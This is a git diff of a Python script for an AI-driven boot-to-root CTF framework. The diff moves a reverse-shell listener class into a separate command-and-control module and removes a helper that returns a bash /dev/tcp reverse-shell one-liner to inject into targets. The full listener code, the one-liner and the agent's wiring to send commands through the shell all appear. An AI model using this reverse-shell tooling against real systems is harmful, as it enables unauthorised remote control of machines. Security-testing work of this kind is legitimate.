@@ -1,6 +1,9 @@
 """
 Advanced Boot2Root CTF Framework with CLI, Code Interpreter and Analysis Modes
 """
+import socket
+import sys
+import threading
 from cai import CAI, Agent
 import pentestperf as ptt
 
@@ -9,6 +12,7 @@ from cai.tools.llm_plugins.code_interpreter import execute_python_code
 from cai.tools.llm_plugins.cli_utils import execute_cli_command
 from cai.tools.web.headers import web_request_framework
 from cai.tools.llm_plugins.reasoning import thought
+from cai.tools.command_and_control.command_and_control import ReverseShellClient
 # Prompts
 cli_agent_system_prompt = open(
     "cai/prompts/system_cli_pentest_expert.txt").read()
@@ -29,100 +33,8 @@ ctf = ptt.ctf(
 )
 ctf.start_ctf()
 
-def reverse_shell(host, port: int = 4444):
-    """
-    Creates a reverse shell command using bash
-    Args:
-        host: Target host IP
-        port: Target port number by default use 4444
-    Returns:
-        str: Bash reverse shell command
-    """
-    return f"Use this reverse shell into the correct attack vector/param in target: bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'"
 
-import socket
-import threading
-import sys
 
-class ReverseShellClient:
-    def __init__(self, host='0.0.0.0', port=4444):
-        self.host = host
-        self.port = port
-        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.running = False
-        self.listener_thread = None
-        self.command_history = []
-        self.client_socket = None
-
-    def handle_client(self, client_socket):
-        self.client_socket = client_socket
-        while True:
-            try:
-                data = client_socket.recv(4096)
-                if not data:
-                    break
-                decoded_data = data.decode()
-                self.command_history.append(decoded_data)
-                sys.stdout.write(decoded_data)
-                sys.stdout.flush()
-            except:
-                break
-        client_socket.close()
-        self.client_socket = None
-
-    def start_listener(self):
-        self.running = True
-        try:
-            self.socket.bind((self.host, self.port))
-            self.socket.listen(1)
-            while self.running:
-                client, addr = self.socket.accept()
-                client_handler = threading.Thread(
-                    target=self.handle_client,
-                    args=(client,)
-                )
-                client_handler.daemon = True
-                client_handler.start()
-        except Exception as e:
-            print(f"Error in listener: {str(e)}")
-        finally:
-            self.socket.close()
-
-    def start(self):
-        """Start the reverse shell listener"""
-        self.listener_thread = threading.Thread(target=self.start_listener)
-        self.listener_thread.daemon = True
-        self.listener_thread.start()
-        return {"status": "Listener started", "host": self.host, "port": self.port}
-
-    def stop(self):
-        """Stop the reverse shell listener"""
-        self.running = False
-        if self.client_socket:
-            self.client_socket.close()
-        self.socket.close()
-        return {"status": "Listener stopped"}
-
-    def send_command(self, command: str):
-        """
-        Send a command to the connected reverse shell
-        Args:
-            command: Command to execute on target
-        Returns:
-            dict: Status of command execution
-        """
-        if not self.client_socket:
-            return {"status": "error", "message": "No client connected"}
-        try:
-            self.client_socket.send(f"{command}\n".encode())
-            return {"status": "success", "message": "Command sent"}
-        except Exception as e:
-            return {"status": "error", "message": str(e)}
-
-    def get_history(self):
-        """Get command history and output"""
-        return {"history": self.command_history}
 
 reverse_client = ReverseShellClient()
 reverse_client.start()
@@ -167,7 +79,6 @@ cli_agent = Agent(
         Thought_Agent,
         Code_Executor_Expert,
         execute_python_code,
-        reverse_shell,
         reverse_client.send_command,
         reverse_client.get_history,
         reverse_client.stop,
